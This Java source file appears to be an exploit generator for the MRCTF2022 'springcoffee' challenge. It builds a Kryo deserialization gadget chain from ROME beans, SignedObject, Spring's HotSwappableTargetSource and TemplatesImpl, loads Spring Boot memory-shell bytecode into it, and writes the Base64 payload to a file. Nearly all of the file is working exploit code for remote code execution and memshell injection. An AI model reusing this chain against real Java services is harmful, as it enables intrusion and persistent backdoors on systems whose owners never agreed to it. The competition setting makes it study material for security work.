import com.esotericsoftware.kryo.Kryo;
import com.esotericsoftware.kryo.io.Input;
import com.esotericsoftware.kryo.io.Output;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ObjectBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.compiler.Template;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import fun.mrctf.springcoffee.model.ExtraFlavor;
import javassist.ClassPool;
import org.json.JSONObject;
import org.springframework.aop.target.HotSwappableTargetSource;
import tools.Evil;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.*;
import java.util.Base64;
import java.util.HashMap;

public class KryoSer {
    protected Kryo kryo = new Kryo();

    public String ser(String raw) throws Exception {
        JSONObject serializeConfig = new JSONObject(raw);
        if (serializeConfig.has("polish") && serializeConfig.getBoolean("polish")) {
            this.kryo = new Kryo();
            for (Method setMethod : this.kryo.getClass().getDeclaredMethods()) {
                if (setMethod.getName().startsWith("set")) {
                    try {
                        Object p1 = serializeConfig.get(setMethod.getName().substring(3));
                        if (!setMethod.getParameterTypes()[0].isPrimitive()) {
                            try {
                                setMethod.invoke(this.kryo, Class.forName((String) p1).newInstance());
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        } else {
                            setMethod.invoke(this.kryo, p1);
                        }
                    } catch (Exception e2) {
                    }
                }
            }
        }


        byte[] bytecode = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_name", "1diOt9");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        byte[] bytes = Files.readAllBytes(Paths.get("D:\\BaiduSyncdisk\\ctf-challenges\\java-challenges\\MRCTF\\MRCTF2022\\springcoffee\\target\\classes\\memshell\\SpringBootController_Higher2_6_0.class"));
        setFieldValue(templates, "_bytecodes", new byte[][] {bytes});

        ToStringBean toStringBean1 = new ToStringBean(Templates.class, templates);
        //防止在put时触发
        EqualsBean equalsBean1 = new EqualsBean(String.class, "any");

        HashMap<Object, Object> hashMap1 = new HashMap<>();
        hashMap1.put(equalsBean1, "any");

        setFieldValue(equalsBean1, "obj", toStringBean1);
        setFieldValue(equalsBean1, "beanClass", ToStringBean.class);



        //固定写法，初始化SignedObject
        KeyPairGenerator keyPairGenerator;
        keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");
        SignedObject signedObject = new SignedObject(hashMap1,privateKey,signingEngine);

//        signedObject.getObject();

        ToStringBean toStringBean2 = new ToStringBean(SignedObject.class, signedObject);

        HotSwappableTargetSource h1 = new HotSwappableTargetSource(toStringBean2);
        // 为防止 put 时提前命令执行，这里先不设置，随便 new 一个 HashMap 做参数
        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new HashMap<>());

        HashMap<Object, Object> hashMap2 = new HashMap<>();
        hashMap2.put(h1, "test1");
        hashMap2.put(h2, "test2");

        // 反射设置 this.target 为 XString 对象
        setFieldValue(h2, "target", new XString("test"));
        setFieldValue(toStringBean2, "obj", signedObject);
        setFieldValue(toStringBean2, "beanClass", SignedObject.class);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Output output = new Output(baos);
        this.kryo.writeClassAndObject(output, hashMap2);
        output.close();

        return new String(Base64.getEncoder().encode(baos.toByteArray()));

    }


    public void deser(String s){
        ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(s));
        Input input = new Input(bais);
        this.kryo.readClassAndObject(input);
    }


    public static void main(String[] args) throws Exception {
        KryoSer kryoSer = new KryoSer();
        String raw = "{\"polish\":true,\"References\": True,\"RegistrationRequired\":false,\"InstantiatorStrategy\": \"org.objenesis.strategy.StdInstantiatorStrategy\"}";
        String ser = kryoSer.ser(raw);
        new FileOutputStream("D:\\tmp\\payload.txt").write(ser.getBytes());
//        kryoSer.deser(ser);

    }


    public static void setFieldValue(Object obj, String fieldName, Object value) throws IllegalAccessException {
        Class<?> aClass = obj.getClass();
        Field field = null;
        while (aClass != null) {
            try{
                field = aClass.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException e) {
                aClass = aClass.getSuperclass();
            }
        }
        field.setAccessible(true);
        field.set(obj, value);
    }

}
